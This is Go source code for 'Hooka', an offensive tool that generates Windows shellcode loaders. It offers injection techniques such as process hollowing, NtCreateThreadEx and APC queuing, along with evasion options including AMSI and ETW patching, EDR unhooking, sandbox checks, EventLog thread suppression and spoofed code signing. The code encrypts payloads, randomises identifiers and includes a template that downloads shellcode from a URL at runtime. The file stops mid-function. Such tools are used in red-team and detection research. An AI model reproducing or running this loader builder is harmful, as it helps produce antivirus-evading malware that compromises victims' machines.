package main

import (
  "fmt"
	"flag"
  "os/exec"
  "strings"
	"os"
  "io/ioutil"
  "strconv"
  "log"
  "errors"
  "bytes"
  "time"
  math_rand "math/rand"
  "encoding/hex"
  "text/template"
	crypto_rand "crypto/rand"
	"crypto/rsa"
	"crypto/tls"
	"crypto/x509"
	"crypto/x509/pkix"
	"encoding/pem"

  "github.com/D3Ext/Hooka/utils"
  "github.com/Binject/go-donut/donut"
)

// define the template which will hold all the variables and function names
type LoaderTemplate struct {
  Vars map[string]string
}

// function to print the banner
func banner(){
  fmt.Println("  _   _                   _              _")
  fmt.Println(" | | | |   ___     ___   | | __   __ _  | |")
  fmt.Println(" | |_| |  / _ \\   / _ \\  | |/ /  / _` | | |")
  fmt.Println(" |  _  | | (_) | | (_) | |   <  | (_| | |_|")
  fmt.Println(" |_| |_|  \\___/   \\___/  |_|\\_\\  \\__,_| (_)")
}

// function to print the help panel
func help_panel(){
  fmt.Println(`
Usage of Hooka:
  REQUIRED:
    -i, --input string        payload to inject in raw format, as PE, as DLL or from a URL
    -o, --output string       name of output file (i.e. loader.exe)
    -f, --format string       format of the payload to generate (available: exe, dll) (default exe)

  EXECUTION:
    --proc string      process to spawn (in suspended state) when needed for given execution technique (default notepad.exe)
    --exec string      technique used to load shellcode (default "SuspendedProcess"):
                         SuspendedProcess
                         ProcessHollowing                         
                         NtCreateThreadEx
                         EtwpCreateEtwThread
                         NtQueueApcThreadEx
                         No-RWX

  AUXILIARY:
    -a, --arch string       architecture of the loader to generate (default amd64)
    -c, --cert string       certificate to sign generated loader with (i.e. cert.pfx)
    -d, --domain string     domain used to sign loader (i.e. www.microsoft.com)
  
  ENCODING:
    --enc string         encrypts shellcode using given algorithm (available: aes, 3des, rc4, xor) (default none)
    --sgn                use Shikata Ga Nai to encode generated loader (it must be installed on path)
    --strings            obfuscate strings using Caesar cipher

  EVASION:
    --unhook string         unhooking technique to use (available: full, peruns)
    --sandbox               enable sandbox evasion
    --no-amsi               don't patch AMSI
    --no-etw                don't patch ETW
    --hashing               use hashes to retrieve function pointers
    --user string           proceed only when the user running the loader is the expected (i.e. DESKTOP-E1D6G0A\admin)
    --computername string   proceed only when the computer name is the expected (i.e. DESKTOP-E1D6G0A)
    --acg                   enable ACG Guard to prevent AV/EDR from modifying existing executable code
    --blockdlls             prevent non-Microsoft signed DLLs from injecting in child processes
    --phantom               suspend EventLog threads using Phant0m technique. High privileges needed, otherwise loader skips this step
    --sleep                 delay shellcode execution using a custom sleep function

  EXTRA:
    --calc              use a calc.exe shellcode to test loader capabilities (don't provide input file)
    --compress          compress generated loader using Golang compiler and UPX if it's installed
    -r, --rand          use a random set of parameters to create a random loader (just for testing purposes)
    -v, --verbose       enable verbose to print extra information
    -h, --help          print help panel

Examples:
  hooka -i shellcode.bin -o loader.exe
  hooka -i http://192.168.1.126/shellcode.bin -o loader.exe
  hooka -i shellcode.bin -o loader.exe --exec NtCreateThreadEx --unhook full --sleep --acg
  hooka -i shellcode.bin -o loader.dll --domain www.domain.com --enc aes --verbose
`)
}

// define shellcode injection techniques
// there are multiple names defined for every technique
// as the names may be a little bit confussing
var techniques []string = []string{"ntcreatethreadex", "ntcreatethread", "suspendedprocess", "etwpcreateetwthread", "processhollowing", "no-rwx", "nrwx", "norwx", "ntqueueapcthreadex"}

var buffer bytes.Buffer

func main() {
  // define variables that will hold CLI arguments values
  var input_file, output_file, format, arch, exec_technique, unhook, username, computername, cert, domain, encrypt, process string
  var sgn, str_obfs, sandbox, noamsi, noetw, hashing, acg, blockdlls, phantom, sleep_time, calc, compress, rand, verbose, help bool

  // Main arguments
	flag.StringVar(&input_file, "i", "", "")
  flag.StringVar(&input_file, "input", "", "")
  flag.StringVar(&output_file, "o", "", "")
  flag.StringVar(&output_file, "output", "", "")
  flag.StringVar(&format, "f", "exe", "")
  flag.StringVar(&format, "format", "exe", "")
  flag.StringVar(&arch, "a", "amd64", "")
  flag.StringVar(&arch, "arch", "amd64", "")

  // Executing shellcode
  flag.StringVar(&exec_technique, "exec", "suspendedprocess", "")
  flag.StringVar(&process, "proc", "C:\\Windows\\System32\\notepad.exe", "")

  // Auxiliary options
  flag.StringVar(&cert, "c", "", "")
  flag.StringVar(&cert, "cert", "", "")
  flag.StringVar(&domain, "d", "", "")
  flag.StringVar(&domain, "domain", "", "")

  // Encoding
  flag.StringVar(&encrypt, "enc", "", "")
  flag.BoolVar(&sgn, "sgn", false, "")
  flag.BoolVar(&str_obfs, "strings", false, "")
  
  // Evasion
  flag.StringVar(&unhook, "unhook", "", "")
  flag.BoolVar(&sandbox, "sandbox", false, "")
	flag.BoolVar(&noamsi, "no-amsi", false, "")
	flag.BoolVar(&noetw, "no-etw", false, "")
  flag.BoolVar(&hashing, "hashing", false, "")
  flag.StringVar(&username, "user", "", "")
  flag.StringVar(&computername, "computername", "", "")
  flag.BoolVar(&acg, "acg", false, "")
  flag.BoolVar(&blockdlls, "blockdlls", false, "")
  flag.BoolVar(&phantom, "phantom", false, "")
  flag.BoolVar(&sleep_time, "sleep", false, "")

  // Extra
  flag.BoolVar(&calc, "calc", false, "")
  flag.BoolVar(&compress, "compress", false, "")
  flag.BoolVar(&rand, "r", false, "")
  flag.BoolVar(&rand, "rand", false, "")
  flag.BoolVar(&verbose, "v", false, "")
  flag.BoolVar(&verbose, "verbose", false, "")
  flag.BoolVar(&help, "h", false, "")
  flag.BoolVar(&help, "help", false, "")

  // parse CLI arguments
	flag.Parse()

  // check especified parameters values just to check no valid value was provided
  if (help) {
    banner()
    help_panel()
    os.Exit(0)
  }

  var err error

  _, err = exec.LookPath("go")
  if err != nil {
    fmt.Println("[-] \"go\" binary is not found on path and it is required to compile the loader")
    log.Fatal(err)
  }

  // check if needed arguments were given
  if (input_file == "") && (!calc) {
    banner()
    help_panel()
    fmt.Println("[-] Provide a valid input file")
    os.Exit(1)
  }

  if (output_file == "") {
    banner()
    help_panel()
    fmt.Println("[-] Provide an output file")
    os.Exit(1)
  }

  format = strings.ToLower(format)

  if (format != "exe") && (format != "dll") {
    banner()
    help_panel()
    fmt.Println("[-] Invalid payload format. Available formats: exe, dll")
    os.Exit(1)
  }

  // check if file exists
  _, input_err := os.Stat(input_file)

  if (strings.ToLower(encrypt) != "none") && (strings.ToLower(encrypt) != "") && (strings.HasPrefix(input_file, "http")) && (errors.Is(input_err, os.ErrNotExist)) {
    banner()
    help_panel()
    fmt.Println("[-] Encryption is not available when providing a URL as input")
    os.Exit(1)
  }

  if (sgn) && (strings.HasPrefix(input_file, "http")) && (errors.Is(input_err, os.ErrNotExist)) {
    banner()
    help_panel()
    fmt.Println("[-] Shikata Ga Nai is not available when providing a URL as input")
    os.Exit(1)
  }

  // Check architecture parameter
  if (arch != "") && (arch != "amd64") && (arch != "386") {
    fmt.Println("[-] Provide a valid architecture. Either amd64 or 386")
    os.Exit(1)
  }

  var valid_technique bool
  for _, technique := range techniques {
    if (strings.ToLower(exec_technique) == technique) {
      valid_technique = true
      break
    }
  }

  // Check valid values for shellcode execution technique
  if (!valid_technique) {
    banner()
    help_panel()
    fmt.Println("[-] Provide a valid shellcode execution technique. Default technique is \"SuspendedProcess\"")
    os.Exit(1)
  }

  exec_technique = strings.ToLower(exec_technique)
  unhook = strings.ToLower(unhook)
  format = strings.ToLower(format)

  // this shellcode execution technique needs unhooking
  if (exec_technique == "suspendedprocess") {
    unhook = "peruns"
  }

  NtAllocateVirtualMemory, NtWriteVirtualMemory, NtProtectVirtualMemory, NtCreateThreadEx, NtQueryInformationThread, NtQueryInformationProcess := GetCallsNames()

  // Check valid values for encryption parameter
  if (encrypt != "") && (strings.ToLower(encrypt) != "aes") && (strings.ToLower(encrypt) != "3des") && (strings.ToLower(encrypt) != "rc4") && (strings.ToLower(encrypt) != "xor") && (strings.ToLower(encrypt) != "none") {
    fmt.Println("[-] Provide a valid encryption cipher. Available ciphers: aes, 3des, rc4, xor, none")
    os.Exit(0)
  }

  // Check valid values for unhooking parameter
  if (unhook != "") && (unhook != "full") && (unhook != "peruns") {
    fmt.Println("[-] Provide a valid unhooking technique. Available techniques: full, peruns")
    os.Exit(1)
  }

  if (cert != "") {
    _, err := os.Stat(cert)
    if (!errors.Is(err, os.ErrNotExist)) {
      fmt.Println("[-] Provide an existing certificate")
      os.Exit(1)
    }
  }

  // check if Shikata Ga Nai is installed on path
  if (sgn) {
    _, err := exec.LookPath("sgn")
    if err != nil {
      fmt.Println("[-] \"sgn\" is not installed on path, visit https://github.com/EgeBalci/sgn to install it")
      log.Fatal(err)
    }
  }

  if (domain != "") || (cert != "") {
    _, err := exec.LookPath("openssl")
    if err != nil {
      fmt.Println("[-] \"openssl\" is not installed on path, it is required to sign the generated loader")
      log.Fatal(err)
    }

    _, err = exec.LookPath("osslsigncode")
    if err != nil {
      fmt.Println("[-] \"osslsigncode\" is not installed on path, it is required to sign the generated loader")
      log.Fatal(err)
    }
  }

  // Generate a random config if --rand parameter was given
  if (rand) {
    fmt.Println("[*] Generating a random set of parameters")
    encrypt, unhook, noamsi, noetw, sgn, str_obfs, acg, blockdlls, sandbox, phantom, compress, sleep_time = GetRandomConfig()
  }

  // print banner
  banner()
  fmt.Println()

  // define key variables
  var imports []string
  var exports []string
  var functions []string
  var dlls_to_unhook []string

  // Create template which will hold loader code
  Main := &LoaderTemplate{}
  // Define variables list
  Main.Vars = make(map[string]string)
  Main.Vars["shellcode"] = utils.RandomString(utils.RandomInt(9,10))
  Main.Vars["enc_shellcode"] = utils.RandomString(utils.RandomInt(9,10))

  var func_name string

  if (format == "dll") {
    func_name = utils.RandomString(utils.RandomInt(8, 10))
  }

  // Get shellcode from raw file, from PE or from DLL
  if (!strings.HasPrefix(input_file, "http")) && (!errors.Is(input_err, os.ErrNotExist)) {
    fmt.Println("[*] Obtaining shellcode from " + input_file)
  } else {
    if (!calc) {
      fmt.Println("[*] Shellcode will be retrieved from " + input_file + " during execution")
    } else {
      fmt.Println("[*] Using calc.exe shellcode")
    }
  }
  time.Sleep(100 * time.Millisecond)

  var shellcode []byte
  var get_shellcode_from_url_func string

  if (!strings.HasSuffix(input_file, ".dll")) && (!strings.HasSuffix(input_file, ".exe") && (!calc) && (!strings.HasPrefix(input_file, "http"))) && (!errors.Is(input_err, os.ErrNotExist)) {
    fmt.Println("  > Shellcode is in raw format")
    time.Sleep(100 * time.Millisecond)

    shellcode, err = utils.GetShellcodeFromFile(input_file)
    if err != nil {
      log.Fatal(err)
    }

  } else if (strings.HasSuffix(input_file, ".dll")) {
    fmt.Println("  > Converting DLL to shellcode (sRDI)")
    time.Sleep(100 * time.Millisecond)

    shellcode, err = utils.ConvertDllToShellcode(input_file, func_name, "")
    if err != nil {
      log.Fatal(err)
    }

  } else if (strings.HasSuffix(input_file, ".exe")) {
    fmt.Println("  > Converting EXE to shellcode using Donut")
    time.Sleep(100 * time.Millisecond)

    config := new(donut.DonutConfig)

    switch strings.ToLower(arch) {
      case "x32", "386":
        config.Arch = donut.X32
      case "x84":
        config.Arch = donut.X84
      default:
        config.Arch = donut.X64
      }

    config.Bypass = 3
    config.Compress = uint32(1)
    config.InstType = donut.DONUT_INSTANCE_PIC

    payload, err := donut.ShellcodeFromFile(input_file, config)
    if err != nil {
      log.Fatal(err)
    }
    
    shellcode = payload.Bytes()

  } else if (calc) {
    shellcode = []byte{0x50, 0x51, 0x52, 0x53, 0x56, 0x57, 0x55, 0x6a, 0x60, 0x5a, 0x68, 0x63, 0x61, 0x6c, 0x63, 0x54, 0x59, 0x48, 0x83, 0xec, 0x28, 0x65, 0x48, 0x8b, 0x32, 0x48, 0x8b, 0x76, 0x18, 0x48, 0x8b, 0x76, 0x10, 0x48, 0xad, 0x48, 0x8b, 0x30, 0x48, 0x8b, 0x7e, 0x30, 0x3, 0x57, 0x3c, 0x8b, 0x5c, 0x17, 0x28, 0x8b, 0x74, 0x1f, 0x20, 0x48, 0x1, 0xfe, 0x8b, 0x54, 0x1f, 0x24, 0xf, 0xb7, 0x2c, 0x17, 0x8d, 0x52, 0x2, 0xad, 0x81, 0x3c, 0x7, 0x57, 0x69, 0x6e, 0x45, 0x75, 0xef, 0x8b, 0x74, 0x1f, 0x1c, 0x48, 0x1, 0xfe, 0x8b, 0x34, 0xae, 0x48, 0x1, 0xf7, 0x99, 0xff, 0xd7, 0x48, 0x83, 0xc4, 0x30, 0x5d, 0x5f, 0x5e, 0x5b, 0x5a, 0x59, 0x58, 0xc3}

  } else if (strings.HasPrefix(input_file, "http")) && (errors.Is(input_err, os.ErrNotExist)) {

    imports = utils.AppendSlice(imports, []string{"net/http", "io"}) // needed imports

    Main.Vars["get_shellcode_from_url_func"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["sc_url"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["req"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["err"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["client"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["resp"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["b"] = utils.RandomString(utils.RandomInt(9,10))

    get_shellcode_from_url_func = `
func {{.Vars.get_shellcode_from_url_func}}({{.Vars.sc_url}} string) ([]byte, error) {
	{{.Vars.req}}, {{.Vars.err}} := http.NewRequest("GET", {{.Vars.sc_url}}, nil)
	if {{.Vars.err}} != nil {
		return nil, {{.Vars.err}}
	}

	{{.Vars.req}}.Header.Set("Accept", "application/x-www-form-urlencoded")
	{{.Vars.req}}.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36")

	{{.Vars.client}} := &http.Client{}
	{{.Vars.resp}}, {{.Vars.err}} := {{.Vars.client}}.Do({{.Vars.req}})
	if {{.Vars.err}} != nil {
		return nil, {{.Vars.err}}
	}
	defer {{.Vars.resp}}.Body.Close()

	{{.Vars.b}}, {{.Vars.err}} := io.ReadAll({{.Vars.resp}}.Body)
	if {{.Vars.err}} != nil {
		return nil, {{.Vars.err}}
	}

	return {{.Vars.b}}, nil
}
`

    // append previous functions
    functions = utils.AppendString(functions, ParseTemplate(get_shellcode_from_url_func, Main))
  }

  if (sgn) {
    fmt.Println("  > Obfuscating shellcode with Shikata Ga Nai")
    time.Sleep(100 * time.Millisecond)

    sgn_shellcode, err := ShikataGaNai(shellcode)
    if err != nil {
      fmt.Println("  > An error has ocurred while obfuscating shellcode, using provided shellcode")
    } else {
      shellcode = sgn_shellcode
    }
  }

  if (verbose) {
    if (encrypt != "") && (strings.ToLower(encrypt) != "none") {
      fmt.Println("  > Using " + strings.ToUpper(encrypt) + " to encrypt the shellcode")
    } else {
      fmt.Println("  > Shellcode encryption is currently disabled")
    }
  }

  fmt.Println()
  time.Sleep(100 * time.Millisecond)

  if str_obfs {
    // define variables
    Main.Vars["caesar_encrypt_func"] = utils.RandomString(utils.RandomInt(9, 10))
    Main.Vars["caesar_decrypt_func"] = utils.RandomString(utils.RandomInt(9, 10))
    Main.Vars["plaintext"] = utils.RandomString(utils.RandomInt(8, 9))
    Main.Vars["shift"] = utils.RandomString(utils.RandomInt(8, 9))
    Main.Vars["ciphertext"] = utils.RandomString(utils.RandomInt(8, 9))
    Main.Vars["char"] = utils.RandomString(utils.RandomInt(8, 9))

    caesar_encrypt_func := `
func {{.Vars.caesar_encrypt_func}}({{.Vars.plaintext}} string, {{.Vars.shift}} int) string {
  {{.Vars.ciphertext}} := ""

	for _, {{.Vars.char}} := range {{.Vars.plaintext}} {
		if {{.Vars.char}} >= 'A' && {{.Vars.char}} <= 'Z' {
      {{.Vars.ciphertext}} += string(({{.Vars.char}}-'A'+rune({{.Vars.shift}}))%26 + 'A')
		} else if {{.Vars.char}} >= 'a' && {{.Vars.char}} <= 'z' {
      {{.Vars.ciphertext}} += string(({{.Vars.char}}-'a'+rune({{.Vars.shift}}))%26 + 'a')
		} else {
      {{.Vars.ciphertext}} += string({{.Vars.char}})
		}
	}

	return {{.Vars.ciphertext}}
}
`

    caesar_decrypt_func := `
func {{.Vars.caesar_decrypt_func}}({{.Vars.ciphertext}} string, {{.Vars.shift}} int) string {
	return {{.Vars.caesar_encrypt_func}}({{.Vars.ciphertext}}, 26-{{.Vars.shift}})
}
`

    // append previous functions
    functions = utils.AppendString(functions, ParseTemplate(caesar_encrypt_func, Main))
    functions = utils.AppendString(functions, ParseTemplate(caesar_decrypt_func, Main))
  }

  // Encrypt shellcode
  var key []byte
  var iv []byte
  if (strings.ToLower(encrypt) == "aes") { // use AES encryption
    key = []byte(utils.RandomString(32)) // generate 32 bytes random key
    iv, err = utils.GenerateIV() // generate random IV
    if err != nil {
      log.Fatal(err)
    }

    // encrypt shellcode
    shellcode, err = utils.AESEncrypt(shellcode, iv, key)
    if err != nil {
      log.Fatal(err)
    }

    imports = utils.AppendSlice(imports, []string{"crypto/aes", "crypto/cipher", "errors"}) // needed imports

    // define variables
    Main.Vars["aes_decrypt_func"] = utils.RandomString(utils.RandomInt(10,12))
    Main.Vars["iv"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["key"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["block"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["err"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["ecb"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["content"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["aes_pkcs5trimming_func"] = utils.RandomString(utils.RandomInt(10,12))
    Main.Vars["encrypt"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["decrypted"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["padding"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["ciphertext"] = utils.RandomString(utils.RandomInt(9,10))

    // define code using templates
    aes_decrypt_func := `
func {{.Vars.aes_decrypt_func}}({{.Vars.ciphertext}} []byte, {{.Vars.iv}} []byte, {{.Vars.key}} []byte) ([]byte, error) {
  {{.Vars.block}}, {{.Vars.err}} := aes.NewCipher({{.Vars.key}})
  if {{.Vars.err}} != nil {
    return nil, {{.Vars.err}}
  }

  if len({{.Vars.ciphertext}}) == 0 {
    return nil, errors.New(` + ObfuscateStr("ciphertext cannot be empty", str_obfs) + `)
  }

  {{.Vars.ecb}} := cipher.NewCBCDecrypter({{.Vars.block}}, {{.Vars.iv}})
  {{.Vars.decrypted}} := make([]byte, len({{.Vars.ciphertext}}))
  {{.Vars.ecb}}.CryptBlocks({{.Vars.decrypted}}, {{.Vars.ciphertext}})

  return {{.Vars.aes_pkcs5trimming_func}}({{.Vars.decrypted}}), nil
}
`

    aes_pkcs5trimming_func := `
func {{.Vars.aes_pkcs5trimming_func}}({{.Vars.encrypt}} []byte) []byte {
  {{.Vars.padding}} := {{.Vars.encrypt}}[len({{.Vars.encrypt}})-1]
  return {{.Vars.encrypt}}[:len({{.Vars.encrypt}})-int({{.Vars.padding}})]
}
`

    // append previous functions
    functions = utils.AppendString(functions, ParseTemplate(aes_decrypt_func, Main))
    functions = utils.AppendString(functions, ParseTemplate(aes_pkcs5trimming_func, Main))

  } else if (strings.ToLower(encrypt) == "3des") { // use 3DES encryption
    key = []byte(utils.RandomString(24)) // generate 32 bytes random key
    shellcode, err = utils.TripleDesEncrypt(shellcode, key) // encrypt shellcode
    if err != nil {
      log.Fatal(err)
    }

    imports = utils.AppendSlice(imports, []string{"crypto/cipher", "crypto/des"}) // needed imports

    // define variables
    Main.Vars["tripledes_decrypt_func"] = utils.RandomString(utils.RandomInt(10,12))
    Main.Vars["data"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["key"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["block"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["err"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["ciphertext"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["iv"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["origdata"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["decrypter"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["decrypted"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["tripledes_pkcs5trimming_func"] = utils.RandomString(utils.RandomInt(10,12))
    Main.Vars["encrypt"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["padding"] = utils.RandomString(utils.RandomInt(9,10))

    // define code using templates
    tripledes_decrypt_func := `
func {{.Vars.tripledes_decrypt_func}}({{.Vars.data}}, {{.Vars.key}} []byte) ([]byte, error) {
  {{.Vars.block}}, {{.Vars.err}} := des.NewTripleDESCipher({{.Vars.key}})
  if {{.Vars.err}} != nil {
    return nil, {{.Vars.err}}
  }

  {{.Vars.ciphertext}} := {{.Vars.key}}
  {{.Vars.iv}} := {{.Vars.ciphertext}}[:des.BlockSize]

  {{.Vars.decrypter}} := cipher.NewCBCDecrypter({{.Vars.block}}, {{.Vars.iv}})

  {{.Vars.decrypted}} := make([]byte, len({{.Vars.data}}))
  {{.Vars.decrypter}}.CryptBlocks({{.Vars.decrypted}}, {{.Vars.data}})
  {{.Vars.decrypted}} = {{.Vars.tripledes_pkcs5trimming_func}}({{.Vars.decrypted}})

  return {{.Vars.decrypted}}, nil
}
`

    tripledes_pkcs5trimming_func := `
func {{.Vars.tripledes_pkcs5trimming_func}}({{.Vars.encrypt}} []byte) []byte {
  {{.Vars.padding}} := {{.Vars.encrypt}}[len({{.Vars.encrypt}})-1]
  return {{.Vars.encrypt}}[:len({{.Vars.encrypt}})-int({{.Vars.padding}})]
}
`

    // append previous functions
    functions = utils.AppendString(functions, ParseTemplate(tripledes_decrypt_func, Main))
    functions = utils.AppendString(functions, ParseTemplate(tripledes_pkcs5trimming_func, Main))

  } else if (strings.ToLower(encrypt) == "rc4") { // use RC4 encryption
    key = []byte(utils.RandomString(32)) // generate 32 bytes random key
    shellcode, err = utils.Rc4Encrypt(shellcode, key) // encrypt shellcode
    if err != nil {
      log.Fatal(err)
    }

    imports = utils.AppendString(imports, "crypto/rc4") // needed imports

    // define variables
    Main.Vars["rc4_decrypt_func"] = utils.RandomString(utils.RandomInt(10,12))
    Main.Vars["psk"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["r"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["err"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["ciphertext"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["src"] = utils.RandomString(utils.RandomInt(9,10))

    // define code using templates
    rc4_decrypt_func := `
func {{.Vars.rc4_decrypt_func}}({{.Vars.ciphertext}} []byte, {{.Vars.psk}} []byte) ([]byte, error) {
  {{.Vars.r}}, {{.Vars.err}} := rc4.NewCipher({{.Vars.psk}})
  if {{.Vars.err}} != nil {
    return nil, {{.Vars.err}}
  }
  
  {{.Vars.src}} := make([]byte, len({{.Vars.ciphertext}}))
  {{.Vars.r}}.XORKeyStream({{.Vars.src}}, []byte({{.Vars.ciphertext}}))
  return {{.Vars.src}}, nil
}
`

    // append previous functions
    functions = utils.AppendString(functions, ParseTemplate(rc4_decrypt_func, Main))

  } else if (strings.ToLower(encrypt) == "xor") { // use XOR encoding
    key = []byte(utils.RandomString(24)) // generate 24 bytes random key
    shellcode = utils.Xor(shellcode, key) // encode shellcode

    // define variables
    Main.Vars["xor_func"] = utils.RandomString(utils.RandomInt(10,12))
    Main.Vars["input"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["key"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["cipher"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["i"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["input"] = utils.RandomString(utils.RandomInt(9,10))

    // define code using templates
    xor_func := `
func {{.Vars.xor_func}}({{.Vars.input}}, {{.Vars.key}} []byte) ({{.Vars.cipher}} []byte) {
  for {{.Vars.i}} := 0; {{.Vars.i}} < len({{.Vars.input}}); {{.Vars.i}}++ {
    {{.Vars.cipher}} = append({{.Vars.cipher}}, ({{.Vars.input}}[{{.Vars.i}}] ^ {{.Vars.key}}[{{.Vars.i}} % len({{.Vars.key}})]))
  }

  return {{.Vars.cipher}}
}
`

    // append previous function
    functions = utils.AppendString(functions, ParseTemplate(xor_func, Main))
  }

  // encoding logic ends here

  fmt.Println("[*] Defining evasion techniques...")
  time.Sleep(100 * time.Millisecond)

  // define hashing algorithm
  var hashing_func string
  rand_num := utils.RandomInt(1,3)

  if (hashing) {
    if (verbose) {
      fmt.Println("  > Adding hashing functions...")
    }
    time.Sleep(100 * time.Millisecond)

    // define variables
    Main.Vars["hashing_func"] = utils.RandomString(utils.RandomInt(10,12))
    Main.Vars["hash"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["str"] = utils.RandomString(utils.RandomInt(9,10))

    if (rand_num == 1) { // use MD5 hashing
      // algorithm is MD5
      imports = utils.AppendSlice(imports, []string{"encoding/hex", "crypto/md5"})

      hashing_func = `
func {{.Vars.hashing_func}}({{.Vars.str}} string) string {
  {{.Vars.hash}} := md5.Sum([]byte({{.Vars.str}}))
  return hex.EncodeToString({{.Vars.hash}}[:])
}
`

    } else if (rand_num == 2) { // use SHA1 hashing
      // algorithm is SHA1
      imports = utils.AppendSlice(imports, []string{"encoding/hex", "crypto/sha1"})

      hashing_func = `
func {{.Vars.hashing_func}}({{.Vars.str}} string) string {
  {{.Vars.hash}} := sha1.Sum([]byte({{.Vars.str}}))
  return hex.EncodeToString({{.Vars.hash}}[:])
}
`

    } else if (rand_num == 3) { // use SHA256 hashing
      // algorithm is SHA256
      imports = utils.AppendSlice(imports, []string{"encoding/hex", "crypto/sha256"})

      hashing_func = `
func {{.Vars.hashing_func}}({{.Vars.str}} string) string {
  {{.Vars.hash}} := sha256.Sum256([]byte({{.Vars.str}}))
  return hex.EncodeToString({{.Vars.hash}}[:])
}
`
    }

    // define structs
    export_struct := `
type Export struct {
  Ordinal        uint32
  Name           string
  VirtualAddress uint32
  Forward        string
}
`

    export_dir_struct := `
type ExportDirectory struct {
  ExportFlags       uint32
  TimeDateStamp     uint32
  MajorVersion      uint16
  MinorVersion      uint16
  NameRVA           uint32
  OrdinalBase       uint32
  NumberOfFunctions uint32
  NumberOfNames     uint32
  AddressTableAddr  uint32
  NameTableAddr     uint32
  OrdinalTableAddr  uint32

  DllName string
}
`

    // append needed exports and imports
    exports = utils.AppendSlice(exports, []string{export_struct, export_dir_struct})
    imports = utils.AppendSlice(imports, []string{"debug/pe", "golang.org/x/sys/windows", "strings", "encoding/binary", "errors"})

    // define variables
    Main.Vars["get_func_ptr_func"] = utils.RandomString(utils.RandomInt(10,12))
    Main.Vars["get_string_func"] = utils.RandomString(utils.RandomInt(10,12))
    Main.Vars["dll"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["p"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["err"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["pe64"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["ddLength"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["edd"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["ds"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["s"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["d"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["exportDirOffset"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["dxd"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["dt"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["ordinalTable"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["dno"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["dnn"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["n"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["ord"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["nameRVA"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["dna"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["exports"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["i"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["ok"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["export"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["exp"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["section"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["start"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["end"] = utils.RandomString(utils.RandomInt(9,10))

    // define code using templates
    get_func_ptr_func := `
func {{.Vars.get_func_ptr_func}}({{.Vars.hash}} string, {{.Vars.dll}} string, {{.Vars.hashing_func}} func({{.Vars.str}} string) string) (*windows.LazyProc, string, error) {
  if (!strings.HasPrefix({{.Vars.dll}}, "C:\\")) {
    {{.Vars.dll}} = ` + ObfuscateStr("C:\\Windows\\System32\\", str_obfs) + ` + {{.Vars.dll}}
  }

  {{.Vars.p}}, {{.Vars.err}} := pe.Open({{.Vars.dll}})
  if {{.Vars.err}} != nil {
    return &windows.LazyProc{}, "", {{.Vars.err}}
  }
  defer {{.Vars.p}}.Close()

  {{.Vars.pe64}} := {{.Vars.p}}.Machine == 0x8664
  var {{.Vars.ddLength}} uint32

  if {{.Vars.pe64}} {
    {{.Vars.ddLength}} = {{.Vars.p}}.OptionalHeader.(*pe.OptionalHeader64).NumberOfRvaAndSizes
  } else {
